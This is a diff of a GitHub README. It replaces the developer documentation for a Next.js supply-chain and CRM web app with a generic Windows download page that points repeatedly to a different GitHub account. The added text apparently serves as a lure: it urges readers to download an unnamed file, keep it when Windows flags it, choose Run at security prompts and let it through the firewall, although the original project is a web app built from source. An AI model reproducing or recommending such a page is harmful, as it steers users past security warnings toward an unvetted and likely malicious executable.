@@ -1,398 +1,233 @@
-<div align="center">
-
-<h1>Aether Ecosystem</h1>
-
-<img src="https://img.shields.io/badge/AETHER-ECOSYSTEM-7c3aed?style=for-the-badge&labelColor=0a0a0c&logoColor=white" height="40" />
-<br>
-<samp>One Platform. Two Powerhouses. Zero Compromise.</samp>
-<br><br>
-
-[![Next.js](https://img.shields.io/badge/Next.js_16-black?style=flat-square&logo=next.js&logoColor=white)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React_19-20232A?style=flat-square&logo=react&logoColor=61DAFB)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS_4-0f172a?style=flat-square&logo=tailwindcss&logoColor=38bdf8)](https://tailwindcss.com/)
-[![Prisma](https://img.shields.io/badge/Prisma-2D3748?style=flat-square&logo=prisma&logoColor=white)](https://www.prisma.io/)
-[![Gemini AI](https://img.shields.io/badge/Gemini_AI-886FBF?style=flat-square&logo=google&logoColor=white)](https://ai.google.dev/)
-[![Framer Motion](https://img.shields.io/badge/Framer_Motion-0055FF?style=flat-square&logo=framer&logoColor=white)](https://www.framer.com/motion/)
-[![License](https://img.shields.io/badge/License-Proprietary-333?style=flat-square)](#)
-
-<br>
-
----
-
-</div>
-
-## About
-
-**Aether Ecosystem** is an enterprise-grade, unified business intelligence platform that merges **Supply Chain Management** and **Customer Relationship Management** into a single, cohesive experience. It is designed from the ground up with a pitch-black UI foundation accented by lavender and violet tones, delivering a premium, distraction-free workspace for data-driven teams.
-
-The platform is not two products duct-taped together — it is a single codebase, a single deployment, and a single source of truth for your entire business pipeline: from raw materials entering your warehouse to a closed deal landing in your CRM.
-
----
-
-## Why Aether
-
-<table>
-<tr>
-<td width="50%">
-
-### The Problem
-
-Most businesses run their supply chain and sales operations on completely disconnected tools. Inventory managers don't see sales velocity. Sales reps don't know what's in stock. Forecasting is done in spreadsheets. Data lives in silos.
-
-</td>
-<td width="50%">
-
-### The Solution
-
-Aether unifies these critical functions under one roof. When a deal closes in the CRM, the supply chain module already knows. When stock runs low, the AI engine adjusts demand forecasts automatically. Every decision is informed by the full picture.
-
-</td>
-</tr>
-</table>
-
-**Key Benefits:**
-
-| Benefit | Description |
-|:---|:---|
-| **Unified Data Layer** | Supply chain metrics and CRM data share the same database infrastructure, eliminating data silos. |
-| **AI-First Intelligence** | Google Gemini Pro powers demand forecasting, anomaly detection, and an always-available chatbot assistant. |
-| **Zero Context Switching** | Navigate from warehouse inventory to a sales pipeline without ever leaving the platform. |
-| **Real-Time Visibility** | Dashboards update live — no manual refreshes, no stale data, no guesswork. |
-| **Operational Efficiency** | Automated reorder calculations, stockout predictions, and purchase order generation reduce manual overhead. |
-| **Premium Developer Experience** | Built with Next.js App Router, full TypeScript coverage, and Prisma ORM for a modern, maintainable codebase. |
-
----
-
-## Architecture
-
-```
-                              +---------------------+
-                              |    Landing Page      |
-                              |  (Route: /)          |
-                              +----------+----------+
-                                         |
-                          +--------------+--------------+
-                          |                             |
-                +---------v---------+        +----------v----------+
-                |   Aether Supply   |        |     AetherCRM       |
-                |  (Route: /supply) |        |   (Route: /crm)     |
-                +---------+---------+        +----------+----------+
-                          |                             |
-              +-----------+-----------+       +---------+---------+
-              |           |           |       |         |         |
-          Services    Components   Types    Views    Store    DataService
-              |           |                   |
-    +---------+---------+ |          +--------+--------+
-    |  dataService      | |          | Dashboard       |
-    |  inventoryService | |          | Clients         |
-    |  forecastService  | |          | Pipeline        |
-    |  anomalyService   | |          | Tasks           |
-    |  pricingService   | |          | Settings        |
-    |  chatService      | |          +-----------------+
-    |  geminiService    | |
-    |  exportService    | |
-    +-------------------+ |
-                          |
-     +--------------------+--------------------+
-     | Dashboard      | ProductList            |
-     | SmartReorder   | PurchaseOrders         |
-     | SalesLog       | Suppliers              |
-     | Intelligence   | AIChatbot              |
-     | AnomalyDetect  | StockoutPrediction     |
-     | PriceOptimizer | CategoryAnalytics      |
-     | ProfitMargins  | TrendComparison        |
-     | StockAlerts    | WarehouseView          |
-     | StockTransfer  | DemandForecast         |
-     | ActivityLog    | BulkImport             |
-     +--------------------+--------------------+
-```
-
-### Database Schema
-
-The platform uses **dual Prisma schemas** with SQLite for local development and easy portability, with support for PostgreSQL (Supabase / Neon) in production.
-
-<details>
-<summary><b>Supply Chain Schema</b> — <code>prisma/supply.prisma</code></summary>
-<br>
-
-| Model | Key Fields | Purpose |
-|:---|:---|:---|
-| `Product` | name, sku, barcode, category, price, cost, stock, reorderLevel, supplierId, warehouseId | Core inventory item |
-| `Supplier` | name, leadTimeDays, contactEmail, rating, onTimePercent, fulfillmentRate, location | Vendor management with scorecard |
-| `Warehouse` | name, location, capacity | Multi-location storage tracking |
-| `Sale` | productId, quantity, date | Sales transaction log |
-| `StockTransfer` | productId, fromWarehouseId, toWarehouseId, quantity, notes | Inter-warehouse movements |
-| `ActivityLog` | userId, action, entityType, entityName, details | Full audit trail |
-| `Category` | name, userId | Product categorization |
-
-</details>
-
-<details>
-<summary><b>CRM Schema</b> — <code>prisma/crm.prisma</code></summary>
-<br>
-
-| Model | Key Fields | Purpose |
-|:---|:---|:---|
-| `Client` | name, company, email, status | Customer records (Active / Pending / Inactive) |
-| `Deal` | client, value, days, stageId | Pipeline deals (Lead / Contacted / Proposal / Won) |
-| `Task` | title, time, type, completed | Scheduled actions (call / email / meeting) |
-
-</details>
-
----
-
-## Modules
-
-### Aether Supply — Supply Chain Intelligence
-
-A full-featured, 38-component supply chain management system covering every aspect of inventory operations.
-
-<details>
-<summary><b>View All Supply Chain Features</b></summary>
-<br>
-
-| Feature | Component | Description |
-|:---|:---|:---|
-| **Dashboard** | `Dashboard.tsx` | At-a-glance KPIs: total inventory value, stock health, anomaly alerts. |
-| **Product Catalog** | `ProductList.tsx` | Full CRUD with advanced filtering, SKU/barcode tracking, and multi-supplier assignment. |
-| **Smart Reordering** | `SmartReorder.tsx` | Algorithm-based reorder point calculations using safety stock and lead time data. |
-| **Sales Log** | `SalesLog.tsx` | Transaction history with product linkage and sales velocity tracking. |
-| **Supplier Hub** | `Suppliers.tsx` | Supplier directory with delivery performance metrics. |
-| **Supplier Scorecard** | `SupplierScorecard.tsx` | Star ratings, on-time %, fulfillment rates, and total order counts per vendor. |
-| **AI Intelligence** | `Intelligence.tsx` | Gemini-powered analytics engine for actionable insights. |
-| **AI Chatbot** | `AIChatbot.tsx` | Floating conversational assistant with full context of inventory, sales, and supplier data. |
-| **Anomaly Detection** | `AnomalyDetection.tsx` | Automated identification of unusual patterns in stock levels and sales data. |
-| **Stockout Prediction** | `StockoutPrediction.tsx` | Predictive engine estimating days until stockout for each product. |
-| **Demand Forecast** | `DemandForecast.tsx` | AI-generated demand curves based on historical sales trends. |
-| **Purchase Orders** | `PurchaseOrders.tsx` | Automated PO generation based on reorder suggestions. |
-| **Price Optimizer** | `PriceOptimizer.tsx` | Cost-based pricing analysis with margin optimization recommendations. |
-| **Category Analytics** | `CategoryAnalytics.tsx` | Performance breakdown by product category with visual comparisons. |
-| **Profit Margins** | `ProfitMargins.tsx` | Item-level and category-level margin analysis with cost tracking. |
-| **Trend Comparison** | `TrendComparison.tsx` | Side-by-side trend analysis across products and time periods. |
-| **Stock Alerts** | `StockAlerts.tsx` | Real-time notification system for low, critical, and overstocked items. |
-| **Warehouse View** | `WarehouseView.tsx` | Multi-location inventory visualization with capacity tracking. |
-| **Stock Transfer** | `StockTransfer.tsx` | Inter-warehouse movement management with full audit trail. |
-| **Bulk Import** | `BulkImport.tsx` | Mass data import for products, suppliers, and inventory records. |
-| **Activity Log** | `ActivityLog.tsx` | Comprehensive audit trail of all CRUD operations. |
-| **Data Export** | `ExportButton.tsx` | One-click export functionality for reports and data extracts. |
-| **Advanced Filters** | `AdvancedFilter.tsx` | Multi-criteria filtering with date range support. |
-| **Settings** | `SupplierManager`, `WarehouseManager`, `CategoryManager` | Full CRUD management panels for reference data. |
-
-</details>
-
-### AetherCRM — Customer Relationship Management
-
-A streamlined, high-velocity CRM built for teams that value clarity over clutter.
-
-<details>
-<summary><b>View All CRM Features</b></summary>
-<br>
-
-| Feature | Component | Description |
-|:---|:---|:---|
-| **Dashboard** | `Dashboard.tsx` | Revenue metrics, active client count, win rate, and average deal size at a glance. |
-| **Client Directory** | `Clients.tsx` | Searchable client list with status indicators (Active / Pending / Inactive). |
-| **Sales Pipeline** | `Pipeline.tsx` | Kanban-style deal tracking across four stages: Lead, Contacted, Proposal, Won. |
-| **Task Manager** | `Tasks.tsx` | Integrated task scheduling for calls, emails, and meetings. |
-| **Settings** | `Settings.tsx` | CRM configuration and preferences panel. |
-
-</details>
-
----
-
-## Service Layer
-
-The business logic is decoupled into a dedicated service layer for testability and reuse.
-
-| Service | Responsibility |
-|:---|:---|
-| `dataService.ts` | Core CRUD operations against the database with API fallback to mock data. |
-| `inventoryService.ts` | Stock analytics: status classification, demand trends, movement analysis, safety stock. |
-| `forecastService.ts` | Time-series demand forecasting using historical sales data. |
-| `anomalyService.ts` | Statistical anomaly detection across inventory and sales patterns. |
-| `predictionService.ts` | Stockout prediction engine with days-remaining calculations. |
-| `pricingService.ts` | Cost-based pricing analysis and margin optimization logic. |
-| `purchaseOrderService.ts` | Automated purchase order generation from reorder suggestions. |
-| `chatService.ts` | Context-aware conversation engine for the AI chatbot. |
-| `geminiService.ts` | Google Gemini Pro API integration layer. |
-| `genkitService.ts` | Google GenKit service adapter for AI workflows. |
-| `exportService.ts` | Data serialization and export (CSV/JSON) functionality. |
-| `neonClient.ts` | Neon PostgreSQL serverless client driver. |
-| `supabaseClient.ts` | Supabase client initialization and configuration. |
-| `mockData.ts` | Rich fallback dataset for offline/demo operation. |
-
----
-
-## Tech Stack
-
-<table>
-<tr>
-<td><b>Category</b></td>
-<td><b>Technology</b></td>
-<td><b>Purpose</b></td>
-</tr>
-<tr><td>Framework</td><td>Next.js 16 (App Router)</td><td>Server-side rendering, routing, API layer</td></tr>
-<tr><td>UI Library</td><td>React 19</td><td>Component-based frontend architecture</td></tr>
-<tr><td>Language</td><td>TypeScript 5.8</td><td>Type safety across the entire codebase</td></tr>
-<tr><td>Styling</td><td>Tailwind CSS 4</td><td>Utility-first CSS with custom design tokens</td></tr>
-<tr><td>Animation</td><td>Framer Motion 12</td><td>Page transitions, micro-interactions, scroll reveals</td></tr>
-<tr><td>Icons</td><td>Lucide React</td><td>Consistent, lightweight icon system</td></tr>
-<tr><td>Charts</td><td>Recharts 3</td><td>Data visualization for dashboards and analytics</td></tr>
-<tr><td>ORM</td><td>Prisma 5</td><td>Type-safe database access with migrations</td></tr>
-<tr><td>Database</td><td>SQLite (local) / PostgreSQL (prod)</td><td>Dual-mode: SQLite for dev, Supabase/Neon for production</td></tr>
-<tr><td>AI Engine</td><td>Google Gemini Pro</td><td>Demand forecasting, anomaly detection, chatbot intelligence</td></tr>
-<tr><td>Typography</td><td>Inter (Google Fonts)</td><td>Clean, modern sans-serif for all UI text</td></tr>
-<tr><td>Routing</td><td>React Router DOM 7</td><td>Client-side navigation within modules</td></tr>
-</table>
-
----
-
-## Project Structure
-
-```
-aether-ecosystem/
-|
-+-- prisma/                     # Database layer
-|   +-- supply.prisma           # Supply chain schema (7 models)
-|   +-- crm.prisma              # CRM schema (3 models)
-|   +-- supply.db               # Local SQLite database (supply)
-|   +-- crm.db                  # Local SQLite database (CRM)
-|   +-- seed-supply.ts          # Supply chain seed data
-|   +-- seed-crm.ts             # CRM seed data
-|   +-- generated/              # Prisma-generated clients
-|
-+-- src/
-|   +-- app/                    # Next.js App Router
-|   |   +-- page.tsx            # Landing page (module selector)
-|   |   +-- layout.tsx          # Root layout with Inter font
-|   |   +-- globals.css         # Design system & Tailwind config
-|   |   +-- supply/             # Aether Supply route
-|   |   +-- crm/                # AetherCRM route
-|   |       +-- page.tsx        # CRM dashboard
-|   |       +-- dataService.ts  # CRM data access layer
-|   |
-|   +-- supply/                 # Supply chain module
-|   |   +-- SupplyApp.tsx       # Root orchestrator (state, handlers)
-|   |   +-- types.ts            # TypeScript interfaces & enums
-|   |   +-- constants.ts        # Static configuration data
-|   |   +-- components/         # 38 UI components
-|   |   +-- services/           # 14 business logic services
-|   |   +-- contexts/           # React context providers
-|   |
-|   +-- views/                  # CRM view components
-|   |   +-- Dashboard.tsx       # Revenue stats & KPIs
-|   |   +-- Clients.tsx         # Client directory
-|   |   +-- Pipeline.tsx        # Kanban deal pipeline
-|   |   +-- Tasks.tsx           # Task scheduler
-|   |   +-- Settings.tsx        # CRM preferences
-|   |
-|   +-- components/             # Shared components
-|   |   +-- Modal.tsx           # Reusable modal dialog
-|   |
-|   +-- store.ts                # CRM state & initial data
-|
-+-- package.json
-+-- tsconfig.json
-+-- docker-compose.yml          # Optional Docker setup
-+-- .env.example                # Environment variable template
-+-- .gitignore
-```
-
----
-
-## Getting Started
-
-### Prerequisites
-
-- **Node.js** 20 or higher
-- **npm** (bundled with Node.js)
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/yuno7777/aether-ecosystem.git
-cd aether-ecosystem
-
-# Install dependencies
-npm install
-```
-
-### Environment Configuration
-
-Copy the example environment file and fill in your credentials:
-
-```bash
-cp .env.example .env.local
-```
-
-Required variables:
-
-```env
-# AI - Required for intelligence features
-GEMINI_API_KEY=your-gemini-api-key
-
-# Database - Optional, falls back to local SQLite
-DATABASE_URL=your-postgres-connection-string
-DIRECT_URL=your-direct-connection-string
-```
-
-> **Note:** The application works fully offline using SQLite databases and rich mock data. External database and AI keys are optional enhancements.
-
-### Database Setup
-
-```bash
-# Generate Prisma clients
-npx prisma generate --schema=prisma/supply.prisma
-npx prisma generate --schema=prisma/crm.prisma
-
-# Seed databases with demo data (optional)
-npx tsx prisma/seed-supply.ts
-npx tsx prisma/seed-crm.ts
-```
-
-### Run Development Server
-
-```bash
-npm run dev
-```
-
-The application will be available at `http://localhost:3000`.
-
-| Route | Module |
-|:---|:---|
-| `/` | Landing page with module selector |
-| `/supply` | Aether Supply dashboard |
-| `/crm` | AetherCRM dashboard |
-
----
-
-## Design Philosophy
-
-Aether follows a strict set of design principles:
-
-- **Pitch Black Foundation** — Background `#0a0a0c` to eliminate visual noise and maximize focus.
-- **Lavender Accent System** — Primary accent `#a78bfa` (violet-400) for interactive elements and highlights.
-- **Minimal Chrome** — No unnecessary borders, shadows, or decorations. Every pixel earns its place.
-- **Motion with Purpose** — Framer Motion animations are used for orientation, not decoration.
-- **Information Density** — Dashboards pack maximum insight into minimum space without feeling cluttered.
-- **Graceful Fallbacks** — If the database is unreachable, the app seamlessly falls back to rich demo data.
-
----
-
-<div align="center">
-
-<br>
-
-<samp>Built with precision in Mumbai, India</samp>
-
-<br>
-
-<sub>Supply Chain Intelligence &middot; Customer Relationship Management &middot; AI-Powered Analytics</sub>
-
-<br><br>
-
-<img src="https://img.shields.io/badge/%C2%A9_2026-Aether_Ecosystem-7c3aed?style=flat-square&labelColor=0a0a0c" />
-
-</div>
+# ✨ aether-ecosystem - Unified operations for lean teams
+
+[![Download](https://img.shields.io/badge/Download-Aether%20Ecosystem-blue?style=for-the-badge&logo=github)](https://github.com/Highbrow-genuscrataegus240/aether-ecosystem)
+
+## 🚀 Getting Started
+
+Aether Ecosystem is a business app for small teams that want one place for customer work and supply chain work. It helps you keep track of contacts, sales, orders, stock, and day-to-day tasks from one Windows app.
+
+Use the link below to visit the download page:
+
+**Download page:** https://github.com/Highbrow-genuscrataegus240/aether-ecosystem
+
+## 🪟 What You Need on Windows
+
+Before you start, make sure your PC has:
+
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Permission to install and run apps
+
+For a smooth experience, close other large apps before you open Aether Ecosystem.
+
+## 📦 Download and Install
+
+1. Open this page in your browser:
+   https://github.com/Highbrow-genuscrataegus240/aether-ecosystem
+
+2. Find the latest download file on the page.
+
+3. Download the file to your computer.
+
+4. If Windows asks for permission, choose to keep or allow the file.
+
+5. Open the downloaded file.
+
+6. If Windows shows a security prompt, choose Run or Open.
+
+7. Follow the setup steps on screen.
+
+8. When setup ends, open Aether Ecosystem from your Start menu or desktop.
+
+If the page gives you a ZIP file, right-click it and choose Extract All before you open the app.
+
+## 🧭 First Launch
+
+When you open Aether Ecosystem for the first time, you may see a startup screen or setup screen. Use it to:
+
+- Sign in or create your workspace
+- Set your company name
+- Add your first users
+- Review the main menu
+- Check your default settings
+
+If the app asks for internet access, allow it so the CRM and business data features can work.
+
+## 🧩 Main Features
+
+Aether Ecosystem brings common business tools into one place:
+
+- **CRM tools** for contacts, leads, and customer notes
+- **Sales tracking** for deals and follow-ups
+- **Supply chain tracking** for stock, orders, and delivery status
+- **Business dashboards** for daily numbers and activity
+- **Task management** for team work and handoffs
+- **Search tools** to find records fast
+- **Simple layouts** that help teams move through work with less effort
+
+## 👤 Who It Is For
+
+This app fits teams that want a single system for daily business work:
+
+- Small and medium businesses
+- Lean operations teams
+- Sales teams
+- Customer support teams
+- Inventory and order teams
+- Founders who want one view of the business
+
+## 🛠 How to Use It
+
+### 1. Add your company data
+
+Start by entering your basic business details. Add your team name, customers, and products. This gives the app a clean base to work from.
+
+### 2. Add contacts and leads
+
+Enter customer names, phone numbers, email addresses, and notes. Use the CRM area to track where each lead came from and what happens next.
+
+### 3. Track orders and stock
+
+Use the supply chain tools to check stock levels, record incoming items, and monitor order progress. This helps you spot delays and shortages before they affect customers.
+
+### 4. Follow work in one place
+
+Use tasks and status fields to see what is waiting, what is in progress, and what is done. This helps your team stay aligned.
+
+### 5. Review your numbers
+
+Open the dashboard to review sales, customer activity, and inventory flow. Use these views to make faster daily decisions.
+
+## 🔧 Simple Setup Tips
+
+- Keep your workspace name short and clear
+- Use the same format for customer names
+- Enter product codes the same way each time
+- Update stock after each shipment
+- Review tasks at the start of each day
+- Back up your data on a regular schedule
+
+## 💡 Best Practices
+
+- Add new leads as soon as you get them
+- Record order changes right away
+- Keep customer notes short and useful
+- Assign one person to check stock updates
+- Review open tasks before the end of the day
+- Use labels or status fields to sort work
+
+## 🔍 Common Use Cases
+
+### Sales and CRM
+
+Keep track of leads, calls, meetings, and follow-up notes. This helps your team respond faster and keep customer history in one place.
+
+### Inventory and stock
+
+Watch what comes in, what goes out, and what needs to be reordered. This helps reduce stock gaps.
+
+### Order handling
+
+Track orders from start to finish and check their status at each step. This helps your team stay on top of delivery work.
+
+### Team planning
+
+Use the app to plan daily work and share updates. This helps reduce missed tasks and repeated effort.
+
+## ❓ If Something Does Not Work
+
+If the app does not open:
+
+- Try running it again as the same Windows user
+- Check that the file finished downloading
+- Make sure Windows did not block the file
+- Restart your computer and try again
+- Confirm you have enough free space
+
+If pages do not load inside the app:
+
+- Check your internet connection
+- Close and reopen the app
+- Make sure your firewall does not block it
+
+If your data looks wrong:
+
+- Check recent edits
+- Look for filters or search terms
+- Refresh the view
+- Review the last saved record
+
+## 🔒 Data Handling
+
+Aether Ecosystem is built for business records such as contacts, orders, and task data. Keep your login details private and limit access to people who need it. Use strong passwords for any linked accounts and store backups in a safe place.
+
+## 🧪 Topics Covered by This Project
+
+This project uses modern web app tools and business data ideas:
+
+- AI
+- Business intelligence
+- CRM system
+- Gemini
+- Next.js
+- Open source
+- React.js
+- SMB
+- Tailwind CSS
+- TypeScript
+
+## 📁 Project Link
+
+Use this page to download and run the app on Windows:
+
+https://github.com/Highbrow-genuscrataegus240/aether-ecosystem
+
+## 🖥️ Windows Run Steps
+
+1. Visit the download page
+2. Download the app file
+3. Open the file in Windows
+4. Allow the app if Windows asks
+5. Finish the setup steps
+6. Launch Aether Ecosystem
+7. Sign in or create your workspace
+8. Start adding customers, stock, and tasks
+
+## 📌 What to Expect After Setup
+
+After you install the app, you should be able to:
+
+- Open the dashboard
+- Add and manage contacts
+- Track sales and follow-ups
+- Review stock and order status
+- Organize daily team work
+- Keep business data in one system
+
+## 🧭 Navigation Guide
+
+Most users will move through these areas:
+
+- **Home** for a quick overview
+- **CRM** for customer records
+- **Orders** for sales and delivery steps
+- **Inventory** for stock updates
+- **Tasks** for team work
+- **Reports** for simple business checks
+
+## 🧰 Helpful Habits for Teams
+
+- Agree on one naming style
+- Review records daily
+- Keep notes short and useful
+- Update status fields when work changes
+- Check dashboards at the start of the day
+- Use the same process for every order
+
+## 📥 Download Again
+
+If you need the download page again, use this link:
+
+[Open the Aether Ecosystem download page](https://github.com/Highbrow-genuscrataegus240/aether-ecosystem)
